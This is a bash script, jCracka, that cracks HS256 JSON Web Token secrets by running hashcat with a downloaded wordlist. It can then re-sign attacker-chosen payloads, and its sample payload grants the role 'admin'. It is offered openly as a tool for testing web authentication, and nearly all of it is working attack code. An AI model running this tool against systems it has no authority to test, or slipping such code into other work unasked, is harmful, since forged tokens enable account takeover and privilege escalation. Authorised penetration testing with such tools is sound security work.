#!/bin/bash
# github.com/OSINTI4L
# jCracka automates the process of attempting to crack and resign HS256 Json Web-Tokens for testing authentication systems in things like WebApps.
# ./jCracka.sh to attempt to crack a user supplied HS256 JWT.
# ./jCracka.sh -r OR ./jCracka.sh --resign to resign a cracked JWT secret with a user supplied Json payload.

echo "░▀▀█░█▀▀░█▀▄░█▀█░█▀▀░█░█░█▀█";
echo "░░░█░█░░░█▀▄░█▀█░█░░░█▀▄░█▀█";
echo "░▀▀░░▀▀▀░▀░▀░▀░▀░▀▀▀░▀░▀░▀░▀";
echo "    github.com/OSINTI4L"
echo ""
sleep 1

readonly RED=$'\e[0;31m'
readonly BLUE=$'\e[0;34m'
readonly GREEN=$'\e[0;32m'
readonly NC=$'\e[0m'

spinner_complete() {
    local msg="Complete "
    local frames=("▼" "■" "◆" "▲")
    for i in {0..3}; do
        printf "\r%s${BLUE}%s${NC}" "$msg" "${frames[i % 4]}"
        sleep 0.25
    done
    printf "\r%s${GREEN}✔${NC}\n" "$msg"
    }

spinner_crack_failed() {
    local msg="Failed, JWT could not be cracked "
    local frames=("▼" "■" "◆" "▲")
    for i in {0..3}; do
        printf "\r%s${BLUE}%s${NC}" "$msg" "${frames[i % 4]}"
        sleep 0.25
    done
    printf "\r%s${RED}✘${NC}\n" "$msg"
    }

jwt_resigner() {
    # Resign JWT
    # Encode string to Base64URL
    b64url_encode() {
        openssl base64 -e | tr -d '=' | tr '+' '-' | tr '/' '_' | tr -d '\n'
    }

    echo "--- JWT Manual Resigner (HS256) ---"

    # Define Header
    header='{"alg":"HS256","typ":"JWT"}'
    echo "Using Header: $header"
    echo ""
    example_jwt_payload='{"sub":"usr_123","name":"John Doe","role":"admin"}'
    echo "Example JWT payload: $example_jwt_payload"
    echo ""
    # Prompt for Payload
    read -rp "Enter one-liner JSON Payload: " user_payload

    if [[ -z "$user_payload" ]]; then
        echo "Error: Payload cannot be empty."
        exit 1
    fi

    # Prompt for Secret Key on the same line
    read -r -p "Enter Secret Key (can be any string, including a Public Key): " secret

    # Encode parts
    header_b64=$(echo -n "$header" | b64url_encode)
    payload_b64=$(echo -n "$user_payload" | b64url_encode)

    # Create Signing Input
    signing_input="${header_b64}.${payload_b64}"

    # Generate Signature (HMAC SHA256)
    signature_b64=$(echo -n "$signing_input" | \
        openssl dgst -sha256 -hmac "$secret" -binary | \
        b64url_encode)

    # Output Result
    echo -e "\n---------------------------"
    echo "Resigned HS256 JWT:"
    echo "${signing_input}.${signature_b64}"
    exit 0
}

##################
##################
## JWT RESIGNER ##
##################
##################
# Check if resign tool invoked:
if [[ "$1" == "--resign" || "$1" == "-r" ]]; then
    # Sanity check for openssl:
    if command -v openssl &> /dev/null; then
        jwt_resigner
    else
        echo -e "${RED}Dependency 'openssl' is not installed, but required!${NC}"
        echo ""
        sleep 1
        while true; do
            read -rp "Would you like to install it now? (y/n): " download_openssl
            echo ""
            if [[ "${download_openssl,,}" == "y" ]]; then
                if ping -c1 -4 github.com &> /dev/null; then
                    echo ""
                    sudo apt update && sudo apt install openssl -y
                    spinner_complete
                    echo ""
                    jwt_resigner
                    break
                else
                    echo -e "${RED}Machine not internet connected, openssl could not be installed!${NC}"
                    echo ""
                    sleep 1
                    echo -e "${RED}Exiting..${NC}"
                    exit 1
                fi
            elif [[ "${download_openssl,,}" == "n" ]]; then
                echo -e "${RED}openssl is required, but not present! Please install before continuing.${NC}"
                echo ""
                sleep 1
                echo -e "${RED}Exiting..${NC}"
                exit 1
            else
                echo -e "${RED}Invalid response: $download_openssl, please use y=yes or n=no${NC}"
                echo ""
                continue
            fi
        done
    fi
fi


#################
#################
## JWT CRACKER ##
#################
#################
# Sanity check for dependencies (wget, hashcat):
for cmd in wget hashcat; do
    if ! command -v "$cmd" &> /dev/null; then
        echo -e "${RED}$cmd is required, but not installed!${NC}"
        echo ""
        sleep 1
        while true; do
            read -rp "Would you like to install it now? (y/n): " install_dependency
            echo ""
            if [[ "${install_dependency,,}" == "y" ]]; then
                if ping -c1 -4 github.com &> /dev/null; then
                    sudo apt update &> /dev/null && sudo apt install $cmd -y
                    spinner_complete
                    echo ""
                    sleep 1
                    break
                else
                    echo -e "${RED}Machine is not internet connected, $cmd could not be installed!${NC}"
                    echo ""
                    sleep 1
                    echo -e "${RED}Exiting..${NC}"
                    sleep 1
                    exit 1
                fi
            elif [[ "${install_dependency,,}" == "n" ]]; then
                echo -e "${RED}Dependency: $cmd is required, but not present! Please install before continuing.${NC}"
                echo ""
                sleep 1
                echo -e "${RED}Exiting..${NC}"
                exit 1
            else
                echo -e "${RED}Invalid response: $install_dependency, please use y=yes or n=no${NC}"
                echo ""
                sleep 1
                continue
            fi
        done
    fi
done

# Check for JWT secrets list, if not present, download:
if [[ ! -f "jwt.secrets.list" ]]; then
    echo -e "${RED}JWT secrets list is not found, but required for jCracka!${NC}"
    echo ""
    sleep 1
    while true; do
        read -rp "Would you like to download the JWT secrets list now? (y/n): " download_secrets_list
        echo ""
        if [[ "${download_secrets_list,,}" == "y" ]]; then
            # Sanity check for internet connection:
            if ping -c1 -4 github.com &> /dev/null; then
                echo -e "${BLUE}Downloading..${NC}"
                echo ""
                sleep 1
                wget -q "https://raw.githubusercontent.com/wallarm/jwt-secrets/refs/heads/master/jwt.secrets.list" -O jwt.secrets.list
                if [[ "$?" -eq "0" ]]; then
                    spinner_complete
                    sleep 1
                    break
                else
                    echo -e "${RED}Download failed!${NC}"
                    echo ""
                    sleep 1
                    echo -e "${RED}exiting..${NC}"
                    rm -f "jwt.secrets.list"
                    sleep 1
                    exit 1
                fi
            else
                echo -e "${RED}Machine not internet connected, secrets list could not be downloaded!${NC}"
                echo ""
                sleep 1
                echo -e "${RED}Exiting..${NC}"
                sleep 1
                exit 1
            fi
        elif [[ "${download_secrets_list,,}" == "n" ]]; then
            echo -e "${RED}JWT secrets list is required, but not present! Please download before continuing.${NC}"
            echo ""
            sleep 1
            echo -e "${RED}Exiting..${NC}"
            exit 1
        else
            echo -e "${RED}Invalid response: $download_secrets_list, please use y=yes or n=no${NC}"
            echo ""
            continue
        fi
    done
fi

# Prompt for JWT:
while true; do
    echo ""
    read -rp "Enter JWT to crack: " user_jwt
    echo ""
    if [[ -z "$user_jwt" ]]; then
        echo -e "${RED}Input cannot be empty!${NC}"
        sleep 1
        continue
    else
        break
    fi
done

# Check to ensure algo is HS256
algo_check=$(echo "$user_jwt" | awk -F'.' '{print $1}' | base64 -d | grep -oi "HS256")
if [[ -z "$algo_check" ]]; then
    echo -e "${RED}JWT must be HS256!${NC}"
    echo ""
    sleep 1
    echo -e "${RED}Exiting..${NC}"
    exit 1
fi

# Attempt to crack with hashcat:
echo -e "${BLUE}Attempting to crack..${NC}"
echo ""
sleep 1
hashcat -a 0 -m 16500 "${user_jwt}" "jwt.secrets.list" &> /dev/null
# If cracked, show secret, else exit:
if [[ "$?" -eq "0" ]]; then
    spinner_complete
    echo ""
    sleep 1
    echo -e "${GREEN}JWT successfully cracked!${NC}"
    sleep 1
    cracked_jwt_secret=$(hashcat -a 0 -m 16500 "${user_jwt}" "jwt.secrets.list" --show | cut -d ':' -f2-)
    echo -e "${GREEN}   Secret: $cracked_jwt_secret${NC}"
    exit 0
else
    spinner_crack_failed
    echo ""
    sleep 1
    echo -e "${RED}Exiting..${NC}"
    exit 1
fi
